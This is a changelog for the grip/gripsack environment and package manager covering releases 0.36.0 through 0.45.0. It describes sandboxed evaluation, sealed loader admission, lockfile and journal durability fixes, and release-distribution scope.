# Changelog

User-visible changes per release. Design archaeology lives in
`plan/`; this file is for "what's new for me".

## [0.45.0] — 2026-10-07

### Fixed

- `pixi.fromLock` frozen consumers no longer fail with `E301: declared source
  differs from its lock`. The captured manifest/lock digests are resolution
  evidence, not declaration fields; both inputs are still re-captured and
  compared before any frozen use. A changed manifest or lock document remains
  refused until an explicit `grip update` and renewed exact-digest approval.
- Sealed GNU-dynamic execution admits the bound platform loader by measured
  capability instead of a glibc >=2.33 version proxy. RHEL 8's glibc 2.28
  loader — which backports `--argv0`, `--glibc-hwcaps-mask`, `--inhibit-cache`,
  `--library-path` and `--inhibit-rpath` — now runs GNU commands with
  unchanged argv[0], sealed executable identity and library-search
  equivalence. A loader missing any required control still fails closed,
  naming the missing controls.
- Sealed-launch admission is stricter everywhere: ELF
  `DT_AUDIT`/`DT_DEPAUDIT`/`DT_FILTER`/`DT_AUXILIARY` objects are refused,
  populated or aliased legacy hwcap directories are refused, an active
  `/etc/ld.so.preload` is refused, and declared `LD_*` inputs other than the
  separately composed `LD_LIBRARY_PATH`, plus `GLIBC_TUNABLES`, are refused
  for GNU-bound execution.
- Source capture cannot be walked around through runtime grants or repository
  aliases. Evaluator runtimes receive exact-file read authority for the
  selected executable, interpreter and measured dependencies instead of whole
  directories; operator PATH entries and runtime selections are admitted
  against the repository's original spelling before canonicalization; grants
  overlapping the repository or its exclusions are refused at approval and
  again at launch. Workspace `fileFetch` classifies the admitted `--repo`
  alias spelling — not only the canonical root — so an excluded subtree cannot
  be fetched live through an alias.

### Added

- Workspace profile hooks execute for real: `post_link`, `post_activate` and
  `on_remove` commands run through the existing durable activation ledger
  with per-intent identity, crash/replay handling and no automatic rollback
  after a post-activation failure. Task `checks` execute as ordered
  postconditions after successful steps; recipe publication checks are
  unchanged. Profile `file.checks` stage adapters, schedules and task
  prerequisites remain explicitly unavailable capabilities.
- `[capture] exclude` in `env.toml` declares literal repository-relative
  subtrees omitted from captured source (`.venv`, an editor-only SDK link).
  Ignored/untracked files stay captured unless excluded; the captured
  configuration binds exclusion rules to the approved bundle; escaping and
  excluded-alias errors name the offending path; `grip trust inspect` (report
  version 2) lists configured `capture_exclusions` alongside actual inventory
  exclusions and names the embedded versus pinned SDK.
- Calling the removed `pixi(package)` constructor reports a structured
  migration diagnostic naming `conda.environment`/`pixi.fromLock` and the
  workspace migration guide instead of `TypeError: pixi is not a function`.

### Compatibility

- Activation plans, pending pointers and outcome records advance to version 2.
  Version-1 records remain readable, and legacy actions keep byte-identical
  serialization. Generation manifests carrying workspace hooks use an explicit
  version-2 envelope that older binaries reject before effects; ordinary
  manifests keep the historical shape. The IR contract and workspace lock
  version are unchanged.
- Measured downgrade behavior after a completed 0.44/0.45 apply: grip 0.42.0
  still reads and operates on legacy and file-only workspace generations; it
  refuses generations with structured environment records ("manifest is
  corrupt — refusing") and rejects workspace-hook envelopes rather than
  misreading either. Downgrade past those generation shapes is unsupported.

### Distribution scope

Linux-first distribution continues under the owner's `REL-REVIEW-0450`
exception: fresh hosted CI and macOS qualification are waived for this patch,
not marked successful; local container gates, real glibc 2.28 (RHEL 8.10) and
modern-glibc execution, security negatives and published-consumer verification
remain required. No hosted-build attestation is claimed for locally assembled
payloads.

## [0.44.1] — 2026-10-04

### Fixed

- Bridge distribution resolves its output directory before mounting it into
  Docker. Relative `--dist dist` now binds the actual staging directory instead
  of creating an empty named volume. Required CI runs the real four-platform,
  two-clean-build pin check before tagging, not only during publication.
- The installer selects a complete published archive/checksum pair for its
  actual target, skipping unpublished or platform-incomplete tags. Transport,
  authorization, server and checksum failures remain terminal; they cannot
  silently downgrade or replace an existing binary.
- Workspace example locks are explicitly migrated to the 0.44.1 captured
  frontend through `grip update`. Changing SDK bytes does not bypass frozen
  frontend admission; renewed source approval remains explicit.

### Distribution scope

The owner selected a Linux-first local release rather than moving either
existing 0.44.0 tag: prebuilt core for Linux x86_64, measured Linux helpers and
the matching SDK. Other unbuilt core targets and hosted-build attestations for
locally assembled payloads are explicitly deferred. Checksums, native checks,
SBOM and actual consumer verification remain required; fresh full hosted CI is
owner-waived, not marked successful. The IR contract is unchanged.

## [0.44.0] — 2026-10-04

SDK published; core publication stopped in bridge packaging before any core
build or upload. The workspace/core changes below are carried into 0.44.1.

### Changed

- Workspace publication includes `gripsack-conda` and orders the production
  `gripsack-buildkit` crate after its fetch/process dependencies.
- The source-built workspace tutorial uses the supported pinned BuildKit policy
  and typed source/output paths; native build/run/task and post-GC reuse are
  exercised rather than left as host-executor declarations.
- Core publication can be dispatched explicitly against an existing version tag,
  so a commit's CI-skip marker does not require moving that tag.

- The workspace SDK exports `pixi.fromLock` for explicit captured-manifest/lock
  imports and `conda.environment` for a coherent solve. The old single-package
  `pixi(package)` constructor is removed; historical IR readers keep their
  versioned meaning. Full all-platform qualification remains open.
- Coherent Conda admission independently checks declared roots, channel order
  and policy, canonical package uniqueness and transitive MatchSpecs before
  archive acquisition. Frozen selections reject missing or unrelated packages;
  native admission reevaluates ordinary and virtual conditional requirements
  against physical capabilities. Imported missing solve facts cannot silently
  disable conditional dependencies, while images report unresolved external
  kernel/CPU/GPU requirements rather than treating them as image capabilities.
- Frozen Conda builds in a fresh home acquire the exact archive URLs and hashes
  already recorded in the lock. They never solve again or refresh repodata;
  corrupt retained archives/prefix evidence still fail rather than being repaired.
- Frontend/import definition pins bind the effective captured code permissions
  (read-only plus executability), not incidental cache umask bits. Code bytes,
  aliases and execution-bit changes remain identity-bearing; source approval
  still records full original permissions. Earlier unreleased v6 definition
  pins require an explicit `grip update` for this corrected derivation.
- Native command admission measures Linux kernel/macOS product versions before
  comparing declared OS floors. A future or incompatible floor is refused rather
  than being accepted from a declaration or left permanently unmeasurable.
- `grip build <output>` now realizes selected v6 recipes/packages without
  creating a personal generation. Compatible Linux production and required
  checks enter one independently checked BuildKit solve; acquisition, export
  validation, retained artifacts and GC remain native. `grip builder
  status|stop|cache-clean` acts only on the recorded owned worker. The bridge
  helper no longer requires `--bridge`: on the first solve that needs it, the
  pinned per-platform helper is downloaded, verified against the sha256
  compiled into this release, and stored under
  `$GRIPSACK_HOME/tools/buildkit-bridge-<version>/`; warm reuse is offline
  and re-verified on every run, a corrupted cache entry is replaced, and
  provisioning failures name the remedy. `--bridge <helper>` remains as an
  explicit operator override, and `GRIPSACK_BRIDGE_MIRROR` redirects only the
  download origin of the pinned artifact (the compiled-in hash still
  authenticates it). Check, plan, preview, rollback and fully cached builds
  download no builder components. The matching release artifacts have measured
  per-platform pins; unpublished source builds can use a matching mirror or
  operator override. Full platform qualification remains open.
- `grip update` publishes portable v6 source/frontend/import pins. Its check
  mode performs no source or lock publication; frozen native acquisition rejects
  changed archive bytes and never silently repeats discovery. Provider packages
  can be built and retained without starting a builder or creating a generation.
- `cargoPackage` lowers a pinned, vendored Cargo source tree into the common
  Linux producer/package model. Offline release tests gate installation of
  declared binaries; dependency checksum failures prevent publication.
- `grip build <image>` exports retained Linux packages through a checked BuildKit
  OCI plan with explicit placement, numeric ownership and runtime configuration.
  Native verification checks descriptors, compressed/uncompressed digests and
  package contents before immutable publication. Cached images and native
  commands survive worker-cache removal; image production creates no generation.
- Profiles consume realized package environments and artifact files through the
  existing journal/generation/rollback lifecycle, including cold production.
  Generation environment records distinguish new literal/store-relative data
  from retained legacy shell expressions; literal `$` and `{store}` text cannot
  become code. Artifact trees expand to bounded per-file ownership rather than
  claiming a whole directory, preserving unrelated children and drift.
- Native project and profile commands preserve multicall selectors even when
  exported under another name. Explicit task package commands keep their byte
  pin and runtime search plan instead of becoming ambient executable paths.
  Linux GNU dynamic commands use separately bound loader/main images; origin
  translation rejects changed library selection and requires glibc >=2.33.
  OCI admission checks image-local ELF/interpreter/library closure, including
  RPATH versus RUNPATH, before publishing the archive.
- Task-declared PATH directories cannot shadow the selected environment's
  exported commands in nested child lookups. Long/spaced Conda relocation
  refuses non-Python interpreter argument combinations that would become a
  single invalid `env` token, instead of publishing an unlaunchable script.
- Native artifacts statically link bundled XZ rather than inheriting a
  Homebrew `liblzma` dependency from the macOS build host.
- The standalone Conda helper also bundles bzip2 and has measured Linux x64,
  Linux ARM64 and Mac ARM64 release pins. Native Mac VM and full coherent Conda
  runtime qualification are temporarily deferred by the owner for Linux
  integration: unavailable hosted VZ and a fail-closed `libgcc_s.1.1.dylib`
  format refusal remain recorded, not counted as passing tests.
- Abandoned builds retain their source roots and staging until an owned-worker
  stop establishes a matching owner/epoch fence and inherited native leases have
  drained. Recovery removes staging before retiring the root and lock records.
- Workspace authoring emits the strict v6 contract: captured inputs, pure
  mutation-lock references, ordered command/action steps, explicit Linux
  toolchains and strict Bash options. Existing v3/v4/v5 readers remain separate.
- Compiler utilities moved from the ordinary SDK root to
  `@gripsack/core/advanced`; the driver selects both entry points from the
  same deliberate package pin. Registry-reset utilities are internal.

## [0.43.0] — 2026-09-29

### Added

- **Kernel-confined evaluation (Linux).** Every evaluator launch and its
  descendants now run inside a Landlock filesystem boundary covering exactly
  the approved captured source roots, the current round's input directory,
  the evaluator's private cache/scratch (TMPDIR is redirected there), the
  selected runtime's load roots and the operator's PATH executable space.
  Reads and writes anywhere else are denied by the kernel — including the
  ambient-ancestor `node_modules` loads stock Deno performs outside its own
  permission flags. `EXECUTE` is granted only at the root: running a binary
  never widens the read/write boundary. Assembly happens before fork; the
  child applies only `PR_SET_NO_NEW_PRIVS` + `landlock_restrict_self`, and
  any failure refuses evaluation rather than running it unconfined.
- Captured local npm packages keep working; direct-ELF, `sh`-wrapper,
  `/usr/bin/env` and python-virtualenv runtimes all run confined.
- **Kernel-confined evaluation (macOS).** The same approved-root boundary
  is assembled before fork and installed by the fixed platform launcher after
  exec, before the admitted evaluator starts. A data-only argv bridge preserves
  argv0 and empty/spaced arguments; sandbox parsing and allocation do not run
  in `pre_exec`. If confinement cannot be installed, evaluation fails closed.
  Native Mac ARM qualification remains required; unconfined execution is not
  a supported or qualifying mode.

- Source approval now binds the canonical repository, copied source digest and
  actual runtime/grant policy. `trust inspect --json` exposes the bounded
  inventory and changes; non-TTY `trust add` requires `--bundle` and `--policy`.
  Old path-only trust must be renewed; `GRIPSACK_TRUST_ALL=1` is rejected.
  Ignored/untracked files, dirty submodules and explicit SDK pins are captured;
  all probe rounds use those copies and separate immutable input files.
- Private versioned evaluation receipts expose source/policy/runtime identities,
  round-input digests and process outcomes through `trust inspect --receipt`.
  They contain no raw source/output or environment values. Frontend completion
  is not a claim that downstream validation, build or deployment succeeded.
- `adopt --resume` continues an approved generated module without rewriting the
  repository. Generated bytes require renewed approval even with `--yes`;
  preview and scoped apply consume the same evaluated snapshot.

- Hook activation now has stable per-intent IDs, increasing interrupted-attempt
  counters and durable success/failure/supersession outcomes. Cache coalescing
  preserves contributing modules; identical custom declarations stay distinct.
  `grip hooks list --json` inspects private pending and archived evidence.
- `grip hooks test`, `--duplicate` and `--crash-after-start` run fixed harmless
  actions in isolated state, including a loopback receiver that commits token
  and effect together. They never select live hooks. Runnable local/remote
  idempotency examples are in `examples/hooks/`.
- Hook children use bounded native supervision, explicit environments and
  descriptor hygiene. Receipts retain executable/script digests and structured
  failures without argv or environment values. Diagnostic controls are escaped.
  The native enforcement/byte-binding tier stays explicit, not a sandbox claim.
- Current v5 workspace file profiles execute through the existing store,
  ownership planner, journal, generations and rollback. Repository sources
  are captured once per command; literal and rendered content compose with
  symlink, tracked-copy and managed-block destinations. Content identity
  excludes destination and owner; retained source/recipe/output bytes make
  rollback independent of today's repository and template variables.
- Distinct managed blocks can share a hosting file across profiles.
  `why-owns` reports every owner; partial selection cannot hide a physical
  destination collision. Package/artifact realization, environments, tasks,
  schedules and workers still require their unavailable executor capabilities.
- An inductive transaction safety pilot checks the existing single-destination,
  one-recovery protocol under explicit domain and durability assumptions.
  The `tlaps` Compose service pins the prover/backend bundle and joins the
  required CI job. This does not claim generalized repeated recovery,
  filesystem refinement or completion of plan/0048 M-V6.
- Generalized protocol induction composes arbitrary finite destination sets,
  repeated recovery without a crash cap, generation publication, exact
  transaction identity, granular activation preparation and GC root protection.
  The proof gate inventories every imported local proof and its named obligation
  floor. Conditional completion experiments remain separate; no Rust/OS
  refinement, hardware durability or remote exactly-once claim is made.
- Managed-block scanning now uses a production state machine proved to emit
  sorted, disjoint, in-bounds and UTF-8-aligned ranges satisfying the existing
  splice contract. The marker grammar is unchanged and separately exercised
  through real update/prune flows; no grammar or filesystem proof is claimed.
- Deterministic journal-admission verification covers required versus nullable
  fields, duplicate identities, retained v1/current v2 entries, truncation and
  scalar boundaries. A calibrated missing-field mutant must fail actual
  recovery-effect checks, not just an error-message snapshot. No serde theorem
  or fuzz result is claimed.
- GC history checks exercise retained payloads, transitive build inputs,
  adopted priors and unfinished recovery through the real collector.
  A deliberately omitted build-closure root must fail the filesystem oracle.
- A real six-destination recovery campaign covers repeated process death and
  sync failures, partial journal cleanup, preserved user edits and collection
  refusal while recovery remains pending. It does not simulate power loss.

### Fixed

- Native macOS release binaries statically link bundled XZ rather than depending
  on the builder's Homebrew installation. Artifact verification distinguishes
  `otool` headers from actual dependencies and admits only explicit system paths.
  Both platform checks locate that verifier from the artifact directory.
- Release publication orders all workspace crates by their actual dependencies.
  TypeScript publication can be dispatched against an existing version tag
  without moving it; Linux publication uses the ARM runner pool.
- macOS's confined launcher can open the root directory required for startup
  without granting recursive reads; unrelated file contents remain denied.
- Source captures finalize their private directory name before read-only sealing
  on macOS. Canonical and declared root aliases select captured native bytes;
  diagnostics retain the declared source spelling without exposing temp paths.

- Evaluated repository aliases materialize their captured target objects into
  native overlays, with matching preview/store identity, rather than retaining
  dangling links or references to a mutable worktree. Takeover cannot replace a
  directory entry named inside the original or captured source root.
- Native diagnostics retain logical source paths and read snippets from the
  evaluated snapshot, not a later edit of the worktree.

- Journaled mutations now require a captured prior under the active transaction
  and keep its pinned destination parent through execution. Current-pointer
  publication consumes that run; only committed or reconciled state authorizes
  cleanup. Effect errors retain the journal, and a nonempty run cannot be
  discarded as an unchanged apply. File and namespace publication barriers
  remain separate, checked stages rather than one assumed durable-write step.
- Cached prior files are sealed along with their containing directory before
  they authorize a deployment. Already-private permissions do not prove an
  interrupted publication became durable; sync failure now leaves the
  destination and current selection unchanged.
- Recovery also seals retained prior bytes before using them for restoration;
  failed file or directory sync retains the destination and journal evidence.
- Namespace admission seals already-visible directory ancestors after an
  interrupted creation attempt. Ambient file/link/tree publishers use the
  admitted root rather than treating an existing path as a completed barrier.
- GC seals generation pruning before collecting payloads whose roots it
  removed. An empty prune list on retry still seals observed absence; failure
  or process death preserves those payloads and the current generation.
- Retained generations now acquire durability authority before apply, rollback,
  recovery, activation or GC effects. Manifest/profile file sync and their
  namespace barriers must succeed before mutation or journal cleanup; generation
  listings and other inspection reads remain read-only.
- GC preserves the highest retained generation in a durable high-water counter
  before pruning legacy history. Missing or stale counters no longer allow a
  later apply to reuse old allocation numbers; higher counters never decrease,
  and exhausted counters still refuse new generations.
- Resumed hook reports no longer manufacture a new generation in an otherwise
  satisfied apply. Resuming prior work does not create fresh IDs and deliver the
  same hooks again as if a new deployment had occurred.
- Repeated rollback to the already-current generation now has a distinct
  transaction identity. Interrupted rollback restores its priors instead of
  treating the unchanged generation number as a completed commit. New markers
  and current pointers bind that identity; ambiguous same-generation legacy
  journals are retained and refused rather than guessed.
- Recovery seals an absent or already-visible prior before discarding its
  journal entry. Interrupted retries cannot mistake kernel-visible state for
  completed durability. Observed committed pointers are synced before cleanup,
  and missing/corrupt current-generation manifests retain recovery evidence.
- GC pins its store, prior and generation directories for both inventory and
  deletion. Substituted directory symlinks and invalid inventories fail before
  generation pruning; orphan payload symlinks are unlinked without following
  their targets, including during size accounting.
- Generation identities and ordered inventories are distinct types. Pruning
  keeps the existing oldest-excess-prefix rule, excluding current without
  shifting deletion to newer generations. Exhausted generation IDs fail
  before activation instead of overflowing.
- Managed plugin cache hits require both the declared source and tag;
  changing origin cannot reuse an unrelated installed binary. Capability
  probing, rate admission and the fetch exchange share one deadline.
- Rate budgets reject nonfinite or sub-token capacities instead of
  panicking or waiting forever. Persisted token balances and timestamps
  are bounded before use. Expired operation deadlines cannot be reset by
  request serialization or a later frontend/protocol exchange.
- Token buckets now use checked exact credits across the full admitted finite
  rate range, including fractional/scientific declarations and rates larger
  than `u64`. Saved balances retain their period and nanosecond timestamp;
  legacy floating balances migrate without minting a fractional credit.
  A backward wall clock cannot refill an already-accounted interval twice.
- Throttle and HTTP cooldown mutex waits consume the original operation
  deadline. Contention cannot grant expired work or start another timeout.
  HTTP attempt order, cumulative waiting and terminal error precedence use
  the verified transition kernel; a body consumer returning after its deadline
  is no longer reported as a successful HTTP operation.
- Process input, frame, stdout, stderr and retained-tail limits now have
  distinct types. Verified transfer/framing/accounting states constrain the
  actual supervisor, including one outstanding input write and signal/reap
  ownership. Finishing cleanup cannot erase an expired operation deadline.
- Process-group signal denials remain failures with their native errno;
  they are no longer silently reported as successful cleanup. Darwin's
  zombie-only-group exception requires complete, identity-stable observations
  within the original deadline rather than treating every `EPERM` as benign.
- Update reports now carry a complete, checked accounting of selected entries.
  Invalid or partial accounting cannot become a successful survey; failures
  dominate changes, and the CLI and executor share one lock-publication
  decision. Check still leaves the lock and source cache untouched and does
  not execute recipes, executable verifiers, deployment or hooks.
- A panicking module completes the scheduler failure transition and wakes
  idle workers instead of hanging a parallel apply. Loom now exercises the
  production mutex/condition-variable coordinator with calibrated
  notification and completion-loss mutants.
- Persisted prior hashes and Unix modes are admitted before use. Restore
  and GC pin the private prior directory; traversal identities, planted
  symlinks and corrupted backup bytes cannot redirect restoration.
- Journal/quarantine directories and records are owner-only (0700/0600),
  including retained metadata encountered during recovery. Reads, moves and
  cleanup use pinned directory capabilities. IO failures retain the record
  for recovery; only decoded malformed records go to quarantine.
- `update --check` and publishing updates compare complete lock entries.
  An unchanged update preserves the existing lockfile bytes.
- Verify/intent steps reject ignored resource declarations with E134;
  place protected work on a producer step.
- Verify actions receive the same E109/E115 path checks as other
  verification declarations. E110 now checks normalized stepped repo
  sources; real fetch/build producers may still create their payload later.
- Invalid merge-splice UTF-8 propagates as an error instead of panicking.
  The Verus gate requires named proof-family coverage and attributes each
  negative to its intended function, diagnostic and source span.

### Persisted-state compatibility

- Journal v2 retains the run's original prior across repeated writes to one
  destination and records the immediate pre-write state. Strict v1 entries
  remain readable; v2 requires its new field. Do not downgrade across an
  unfinished v2 transaction.
- Existing generation ownership strings retain their meaning. Workspace
  blocks use a disjoint object-shaped ownership value, so older readers
  reject rather than reinterpret them as module-named blocks. Historical
  v4 workspaces remain read-only.
- Generation, journal-marker and pending-activation IDs remain numeric on disk.
  Historical zero IDs remain readable; noncanonical or duplicate inventory
  identities cannot enter pruning policy.

## [0.42.0] — 2026-09-10

Verified merge, build-closure and scheduling foundations (0047): the
second verification round moves the byte-integrity heart of merge mode
and the scheduler's decision logic behind machine-checked contracts —
and the scheduler's production decisions now ARE the proved kernel.

### Added

- **Proven merge splice.** `ManagedBlockSet` removal/upsert run
  through a verified byte-level kernel: the output keeps every foreign
  byte verbatim and in order, and replacing a block with its own
  bytes is exactly the identity. The marker-grammar parser side
  (Layer 2) stays on the roadmap with its bound recorded.
- **Proven build closures.** The build-reachable set is now computed
  by a kernel proved sound and complete against a path-reachability
  specification — cyclic graphs included — and the build-only verdict
  is exactly build-minus-runtime.
- **The scheduler's decisions are proved, and production uses the
  proof's code.** `run_all` routes every readiness, dependent-release
  and failure-latch decision through `PureScheduler`: a module starts
  only after every dependency finished successfully, at most once,
  and never after any failure. The threads and the mutex/condvar
  bridge are unchanged and stay under journey/e2e test — decisions
  are proved, mechanics are tested.
- **Calibration grows to four mutants.** The `verify` gate now also
  proves the proofs see their contracts: a splice that drops the
  foreign tail, a closure that loses a reachable module, and a
  scheduler that starts work after a failure must each fail a named
  contract.
- `verification/guarantees.md`: `MERGE-SPLICE-001`,
  `GRAPH-CLOSURE-001` and `SCHEDULER-001` are **checked**.

IR remains v3. Core and SDK ship together at 0.42.0. The SDK is
byte-identical to 0.40.0's frontend; the matching version keeps
`doctor`'s pin comparisons honest.

## [0.41.0] — 2026-09-10

Verified decision kernels (0046): the recovery, ownership and GC
decision functions now carry machine-checked contracts.

### Added

- **Machine-proven policy kernels.** A new `gripsack-policy` crate
  holds the decision functions the transaction protocol leans on,
  verified by Verus against contracts derived from the authority rules
  (not the branch structure): the commit classifier (Committed ⟺
  current == target; Uncommitted ⟺ current == previous ≠ target or a
  fresh machine with no current; Ambiguous otherwise — target
  precedence explicit), the ownership decisions (preserved drift never
  authorizes; updates require agreement with the last managed write),
  and GC planning (admission failure yields no destructive plan; the
  current generation is never pruned; the deletion set is exactly
  candidates-minus-roots, and growing roots cannot grow deletions).
  Production, the Rust explorers and the verifier share ONE
  implementation — there is no parallel "verified" copy.
- **`docker compose run --build --rm verify`** — the new gate:
  positive proofs plus a seeded semantic mutant that must fail its
  named postcondition, running in CI's required `test` job. Toolchain
  pinned (Verus 0.2026.09.06.8dea4a2, Rust 1.98.0 — the repo's
  existing pin, Z3 4.16.0). Plain cargo and the musl release build
  compile the same annotated source with specifications erased — no
  verifier needed to build or run grip.
- **Operation contracts are structural.** `Op` fields are private with
  a coherence-checked constructor; a removal carries its authority in
  the variant; a preview-only marker op reaching execution is a
  classified error, never a panic. One planner still serves plan,
  apply and rollback.
- `verification/guarantees.md`: `CLASSIFY-001`, `OWNERSHIP-001` and
  `GC-RECOVERY-001` are **checked**; the ledger records admission
  boundaries, trusted components and calibrations.

IR remains v3. Core and SDK ship together at 0.41.0. The SDK is
byte-identical to 0.40.0's frontend; the matching version keeps
`doctor`'s pin comparisons honest.

## [0.40.0] — 2026-09-10

Recovery admission hardening and editor-reachable frontends (0045).

### Fixed

- **Journal identities are tagged and versioned on the wire.** The
  pre-0.40 bare-string encoding let a post-crash symlink whose target
  spelled the removal sentinel (`gripsack:removed`) or a file identity
  pass for the mutation itself, so recovery could "restore" over a user
  edit. Entry intents are now `{"kind": "removed" | "file" | "link"}`
  records; the recovery kernel compares typed values; non-UTF-8 symlink
  targets and non-UTF-8 destinations are refused at admission with the
  object preserved. **Pre-0.40 journal entries are never
  reinterpreted**: they quarantine with a named reason and block
  recovery until inspected — a 0.39 crash window needs a hand-check of
  `$GRIPSACK_HOME/journal/quarantine/` (the interrupted run's edits are
  restored by hand or the entry deleted).
- **A run marker missing `previous_generation` is rejected at parse.**
  The key is required on the wire (explicit `null` remains the
  fresh-machine form); previously a torn marker silently read as a
  fresh machine.
- **`gc` refuses while recovery is unfinished.** A run marker, journal
  entry or quarantined entry blocks collection — dry-run included, with
  nothing deleted — because a journaled prior blob may be referenced by
  no retained manifest. Run `grip apply` (or `rollback`) to reconcile,
  then collect.

### Added

- **The embedded frontend is editor-reachable.** The npm package and
  the materialized `$GRIPSACK_HOME/frontend/ts-<version>/` tree now
  resolve types straight from `src/index.ts` — no phantom `dist/` in
  `types` — and materialization flips a stable
  `$GRIPSACK_HOME/frontend/current` symlink. Point an editor at it —
  symlink `node_modules/@gripsack/core` → `frontend/current` or a
  tsconfig `paths` entry — with `npm i -D @types/node` and
  `noEmit` + `allowImportingTsExtensions` in tsconfig. `grip doctor`
  prints the exact wiring. The package keeps shipping compiled
  `dist/` as the runtime entry: Deno never type-strips under a real
  (non-symlinked) `node_modules`, so the deliberate pin executes the
  compiled form while editors read the source.
- **Mutation authority is a type.** `LifecycleSession` owns the
  lifecycle lock and the home it covers; `gc`, `rollback` and
  `store verify --repair` cannot run without one — the lock is no
  longer a caller convention for library consumers.
- `verification/guarantees.md` opens the guarantee ledger: four
  entries with admission boundaries, trusted components, bridges and
  calibrations.

IR remains v3. Core and SDK ship together at 0.40.0.

## [0.39.0] — 2026-09-09

Complete surveys, explicit version spelling, and transport evidence (0044).

### Fixed

- **Merge never discards an unowned tail after an unmatched marker.** One
  lossless scan supplies inspection and rewriting. Malformed/nested/interleaved
  markers fail before mutation. Every duplicate contributes mode and edit
  evidence, so reordering duplicates cannot bypass a chmod guard. Foreign bytes
  are retained rather than broadly trimmed or normalized.
- **Uncomputable previews fail**, instead of printing a warning then a successful
  plan. Available matching payloads also receive offline layout preflight.
- **Enterprise authentication failures explain host binding** during resolution
  and locked cold downloads: missing credentials, unbound/mismatched GH_HOST,
  and rejected bound credentials are distinct. URL credentials/query material
  are redacted in transport diagnostics.

### Added

- **Complete `update --check` surveys** report unchanged, would-change, failed
  and inapplicable modules, with an incomplete summary when anything failed.
  Exit **0** means complete/current; **1** means complete/changes available;
  **2** means incomplete or operational failure. No source-cache or lock publication.
- **`{version.bare}`** removes exactly one leading lowercase `v` in GitHub asset
  patterns and payload install/config/verify paths. Raw `{version}` path semantics
  and its legacy raw-first asset search remain unchanged; lockfiles keep raw tags.
- **Exact source-only layout preflight** runs after acquisition/overlay and before
  publication. A known missing path fails with the pattern, tag, concrete path and
  observed top-level entries. Recipe outputs and executable verification remain
  explicitly deferred; read-only commands do not run them.
- **Bounded HTTP retries** cover classified transient GET failures: three policy
  attempts, one 600s operation deadline and at most 30s retry waiting. Server
  cooldowns are respected, partial spools restart from zero, and transfer-byte
  accounting spans retries. Terminal errors name attempts and the stopping reason;
  known cooldowns avoid hammering subsequent same-host requests.
- Four focused TLA+ models, five positive configurations and eleven calibrated
  negatives, paired with real parser/reducer/retry/authentication model bridges
  and offline CLI regressions.

IR remains v3; `{version.bare}` requires core 0.39.0 or newer. Core and SDK ship
together at 0.39.0. GH_HOST remains explicit credential authority: base_url is
not a token grant. Opt-in gh credential reuse and read-only recipe-output
inventories remain on the roadmap. No RHEL/Space deployment is claimed.

## [0.38.0] — 2026-09-07

Migration feedback, permission identity, and honest read-only updates (0043).

### Added

- **`grip update --check`** resolves and acquires into private scratch, reports
  would-be pin changes, and leaves the lockfile and source cache unpublished.
  Exit 0 means current; exit 1 means changes are available. Recipes never run.
- **Permission-policy model coverage**: a corrected `FileMode.tla`, twelve
  positive lanes and four named counterexamples, plus a Rust explorer driving
  the shipped planner/executor through copy, template, merge, and link modes.

### Fixed

- **Executable templates stay executable.** Templates and tracked copies share
  fresh 0755/0644 source-executability policy and preserve acquired access on
  updates. SHA-256 identity includes rendered bytes and full permissions.
  Chmod-only drift is visible in plan, preserved with a warning on apply and
  rollback, and never authorizes prune—even after repeated observations.
  Templates add no in-file banner; their manifest is the identity record.
- **Merge markers record the hosting-file mode** alongside the block hash.
  New hosts use planner-selected 0644; existing hosts keep their permissions.
  Old markers upgrade in place. Chmod drift guards reapply and prune without
  changing unmanaged content; store verification reports destination drift
  without treating it as store corruption or deleting healthy artifacts.
- **Doctor checks the installed frontend**, not just the declared npm range.
  A stale local `node_modules/@gripsack/core` is a MISS even with a newer
  package.json declaration. Advice names both updating and removing the pin.
- **Tuicr pack coverage is 0.20–0.25**, with real `[forge]` and `[export]`
  sections and a migration hint for `export_legend`. Supported v0.22 configs
  no longer produce the stale-coverage warning; v0.19 still does.

IR remains v3; old lockfiles and generations remain readable. Legacy template
receipts authorize changes only when both the bytes hash and recorded mode
match. Core and `@gripsack/core` ship together at 0.38.0.

## [0.37.0] — 2026-09-07

Complete source pins, bounded acquisition, and stronger protocol evidence
(plan/0042).

### Added

- **One-commit source updates**: `grip update` acquires and verifies selected
  sources, captures repo overlays, and completes their pins before replacing
  the lockfile once. Source-only artifacts are cached without deployment;
  build recipes and activation hooks never run during update. Warm and cold
  apply preserve completed lock bytes. A failed update leaves the old lock intact.
- **Independent acquisition limits**: two concurrent payloads by default,
  512 MiB downloaded and 4 GiB expanded per payload, 100,000 entries and
  a 128 MiB decoder budget. Positive `[settings]` values override these limits.
  Verified private spools replace payload-sized memory buffers; archive path,
  link, metadata and actual decoded-byte limits fail before publication.
- **Bounded protocol supervision** for fetchers, capability probes and linters:
  request/line/output/diagnostic caps, retained stderr tails, nonblocking pipes,
  owned process groups and deadlines that include cleanup. Cleanup failures
  are reported; kernel progress remains an explicit assumption.
- **Executable published examples**, checked against the actual npm package
  and core, plus persistent manifest/merge/archive/recovery/GC fuzz corpora.
  Repeated-recovery, activation, process-supervision and concurrent-publication
  models carry positive checks and calibrated counterexamples.

### Fixed

- Pixi pins use the installed primary-package version and the core-harvested
  tree hash consistently in update and apply; conda bookkeeping is excluded.
  Locked bottle URLs and versions survive registry changes during reconstruction.
  Git branch/tag declarations are frozen to their resolved commit, so a moved
  upstream ref cannot break a pinned cold reconstruction.
- Repo overlays are hashed from a private snapshot, replace leaf symlinks rather
  than following them, and refuse fetched symlink ancestors. Missing overlays
  invalidate cached merged trees; directory and dangling source links retain
  consistent content identity.
- Self-update serializes per executable, rechecks the installed version under
  its lock, selects one regular executable, and publishes bytes and mode durably.
  Post-rename durability failures never roll the executable back.
- Worker and step logs retain their run ancestry. Failed-test diagnostics use
  the explicit latest-run pointer, with a validated timestamp fallback.
- IR v3 rejects silent-drop fields in nested tagged nodes and spans; JSON Schema
  structural admission follows the parser. Valid step-intent triggers are accepted.

### Changed

- Rust, Deno, base images and release tooling are deliberately pinned. A
  two-clean-build runner records exact image/lock/toolchain inputs and compares
  release binaries; it makes no universal cross-time reproducibility claim.
- The SDK exports a closed `Build` type shared by `module()` and `buildStep()`.
  IR stays at v3; existing lockfiles and generations remain readable. Update a
  deliberate SDK pin to `@gripsack/core@^0.37.0`.

## [0.36.0] — 2026-09-07

Contract fidelity and persistence evidence (plan/0041), followed by a
placement and representation review.

### Fixed

- **GC fails closed before deletion** on malformed module/build-closure
  store roots or invalid/unreadable retention configuration, including
  dangling config links. Missing repair artifacts remain valid references.
- **Explicit steps keep module contracts**: source staging, config lint
  and pre-flip module verification use the same prepared view as data-style
  modules. Failed verification cannot commit a generation.
- **Cross-module `needs` actually orders work**, including subset applies.
